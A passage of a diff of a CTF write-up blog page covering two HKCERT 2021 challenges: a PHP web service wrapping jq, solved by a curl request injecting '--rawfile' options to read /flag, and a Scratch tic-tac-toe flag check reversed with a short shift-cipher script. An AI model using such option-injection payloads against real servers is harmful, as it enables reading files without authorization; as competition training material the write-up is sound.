+</span></span><span class=line><span class=cl>  }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  $filter = escapeshellarg($_POST[&#39;filter&#39;]);
+</span></span><span class=line><span class=cl>  $json = escapeshellarg($_POST[&#39;json&#39;]);
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  $options = &#34;&#34;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  if (!empty($_POST[&#39;options&#39;]) &amp;&amp; is_array($_POST[&#39;options&#39;])) {
+</span></span><span class=line><span class=cl>    foreach ($_POST[&#39;options&#39;] as $o) {
+</span></span><span class=line><span class=cl>      $options .= escapeshellarg($o) . &#39; &#39;;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>  }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  $command = &#34;jq $options $filter&#34;;
+</span></span><span class=line><span class=cl>  passthru(&#34;echo $json | $command&#34;);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  die();
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>We can see that we are providing parameters and input to call the <code>jq</code> and our goal is to get the file <code>/flag</code>. With some <a href=https://www.jianshu.com/p/e05a5940f833 target=_blank rel="noopener noreffer">Googling</a> I found that we can use <code>--rawfile</code> to get the file content. With some trials to crafting the payload, we can get the flag by reflecting the content out with the command <code>echo {"data":{"update":null}}' | jq --rawfile a /flag '.data.update = $a'</code>.</p><p><strong>Solve:</strong><br><code>curl -X POST 'http://chalp.hkcert21.pwnable.hk:28370/' -F 'filter=.data.update=$a' -F 'json={"data":{"update":null}}' -F 'options[]=--rawfile' -F 'options[]=a' -F 'options[]=/flag'</code></p><p>FLAG : <strong>hkcert21{y0u\are\n0w\jq\expert!}</strong></p><h2 id=回到12歲-scratch-tic-tac-toe---misc-200-points>回到12歲 (scratch-tic-tac-toe) - Misc (200 points)</h2><h3 id=challenge--7>Challenge :</h3><blockquote><p>If you can beat me in the game I&rsquo;ll give you the flag!<br><a href=https://scratch.mit.edu/projects/596813541/ target=_blank rel="noopener noreffer">https://scratch.mit.edu/projects/596813541/</a></p></blockquote><h3 id=solution--7>Solution :</h3><p>This is a Tic-Tac-Toe game written in Scratch. It did bring me back to my F.4 life which I learnt about Scratch in my ICT lesson.<br>We can click the <code>See inside</code> button to view the source code of this project. By selecting the <code>Title</code>, we can see a yellow notes and if you remove it, you can see the key logic of getting the flag.
 <img class=lazyload src=/svg/loading.min.svg data-src=https://user-images.githubusercontent.com/19466939/143604250-dfb3428b-8be6-4589-8e69-f92c5b1fdf4b.png data-srcset="https://user-images.githubusercontent.com/19466939/143604250-dfb3428b-8be6-4589-8e69-f92c5b1fdf4b.png, https://user-images.githubusercontent.com/19466939/143604250-dfb3428b-8be6-4589-8e69-f92c5b1fdf4b.png 1.5x, https://user-images.githubusercontent.com/19466939/143604250-dfb3428b-8be6-4589-8e69-f92c5b1fdf4b.png 2x" data-sizes=auto alt=https://user-images.githubusercontent.com/19466939/143604250-dfb3428b-8be6-4589-8e69-f92c5b1fdf4b.png title=tictactoe1>
-<img class=lazyload src=/svg/loading.min.svg data-src=https://user-images.githubusercontent.com/19466939/143604259-5feaca57-6fe7-4d84-b6d5-7b8dadc07a2c.png data-srcset="https://user-images.githubusercontent.com/19466939/143604259-5feaca57-6fe7-4d84-b6d5-7b8dadc07a2c.png, https://user-images.githubusercontent.com/19466939/143604259-5feaca57-6fe7-4d84-b6d5-7b8dadc07a2c.png 1.5x, https://user-images.githubusercontent.com/19466939/143604259-5feaca57-6fe7-4d84-b6d5-7b8dadc07a2c.png 2x" data-sizes=auto alt=https://user-images.githubusercontent.com/19466939/143604259-5feaca57-6fe7-4d84-b6d5-7b8dadc07a2c.png title=tictactoe2></p>
-<p>We can see that if we input the correct flag, the program will perform some process and check if it is equal to <code>03vx{_ihq0xhh7svtx}t{sv180x{r</code>. Therefore, by reversing the logic, we can get the flag.</p>
-<p><strong>Solve:</strong></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+<img class=lazyload src=/svg/loading.min.svg data-src=https://user-images.githubusercontent.com/19466939/143604259-5feaca57-6fe7-4d84-b6d5-7b8dadc07a2c.png data-srcset="https://user-images.githubusercontent.com/19466939/143604259-5feaca57-6fe7-4d84-b6d5-7b8dadc07a2c.png, https://user-images.githubusercontent.com/19466939/143604259-5feaca57-6fe7-4d84-b6d5-7b8dadc07a2c.png 1.5x, https://user-images.githubusercontent.com/19466939/143604259-5feaca57-6fe7-4d84-b6d5-7b8dadc07a2c.png 2x" data-sizes=auto alt=https://user-images.githubusercontent.com/19466939/143604259-5feaca57-6fe7-4d84-b6d5-7b8dadc07a2c.png title=tictactoe2></p><p>We can see that if we input the correct flag, the program will perform some process and check if it is equal to <code>03vx{_ihq0xhh7svtx}t{sv180x{r</code>. Therefore, by reversing the logic, we can get the flag.</p><p><strong>Solve:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>charset = &#34;abcdefghijklmnopqrstuvwxyz0123456789{}_&#34;
-cipher = &#34;03vx{_ihq0xhh7svtx}t{sv180x{r&#34;
-flag = &#34;&#34;
-for i in range(len(cipher)):
-    flag = flag + charset[charset.find(cipher[i]) - 19 % len(charset)]
-print(flag)
-</code></pre></td></tr></table>
-</div>
-</div><p>FLAG : <strong>hkcert21{he11o_caesar_cipher}</strong></p>
-</div><div class=post-footer id=post-footer>
-<div class=post-info>
-<div class=post-info-line>
-<div class=post-info-mod>
-<span>Updated on 2021-11-15</span>
-</div>
-<div class=post-info-license></div>
-</div>
-<div class=post-info-line>
-<div class=post-info-md></div>
-<div class=post-info-share>
-<span></span>
-</div>
-</div>
-</div>
-<div class=post-info-more>
-<section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/ctf/>ctf</a>,&nbsp;<a href=/tags/writeup/>writeup</a>,&nbsp;<a href=/tags/web/>web</a>,&nbsp;<a href=/tags/misc/>misc</a>,&nbsp;<a href=/tags/pwn/>pwn</a>,&nbsp;<a href=/tags/reverse/>reverse</a>,&nbsp;<a href=/tags/crypto/>crypto</a></section>
-<section>
-<span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span>
-</section>
-</div>
-<div class=post-nav><a href=/posts/allesctf-2021/ class=prev rel=prev title="ALLES!CTF 2021 Writeup"><i class="fas fa-angle-left fa-fw"></i>ALLES!CTF 2021 Writeup</a></div>
-</div>
-</article></div>
-</main><footer class=footer>
-<div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.89.4">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
-</div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2021</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Ja5on</a></span></div>
-</div>
-</footer></div>
-<div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top">
-<i class="fas fa-arrow-up fa-fw"></i>
-</a><a href=# id=view-comments class=fixed-button title="View Comments">
-<i class="fas fa-comment fa-fw"></i>
-</a>
-</div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:100},comment:{}}</script><script type=text/javascript src=/js/theme.min.js></script></body>
-</html>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>charset = &#34;abcdefghijklmnopqrstuvwxyz0123456789{}_&#34;
+</span></span><span class=line><span class=cl>cipher = &#34;03vx{_ihq0xhh7svtx}t{sv180x{r&#34;
+</span></span><span class=line><span class=cl>flag = &#34;&#34;
+</span></span><span class=line><span class=cl>for i in range(len(cipher)):
+</span></span><span class=line><span class=cl>    flag = flag + charset[charset.find(cipher[i]) - 19 % len(charset)]
+</span></span><span class=line><span class=cl>print(flag)
+</span></span></code></pre></td></tr></table></div></div><p>FLAG : <strong>hkcert21{he11o_caesar_cipher}</strong></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2021-11-15</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/ctf/>ctf</a>,&nbsp;<a href=/tags/writeup/>writeup</a>,&nbsp;<a href=/tags/web/>web</a>,&nbsp;<a href=/tags/misc/>misc</a>,&nbsp;<a href=/tags/pwn/>pwn</a>,&nbsp;<a href=/tags/reverse/>reverse</a>,&nbsp;<a href=/tags/crypto/>crypto</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/allesctf-2021/ class=prev rel=prev title="ALLES!CTF 2021 Writeup"><i class="fas fa-angle-left fa-fw"></i>ALLES!CTF 2021 Writeup</a>
+<a href=/posts/spyce2/ class=next rel=next title="HKCERTCTF 2021 Writeup">HKCERTCTF 2021 Writeup<i class="fas fa-angle-right fa-fw"></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Ja5on</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:100},comment:{}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
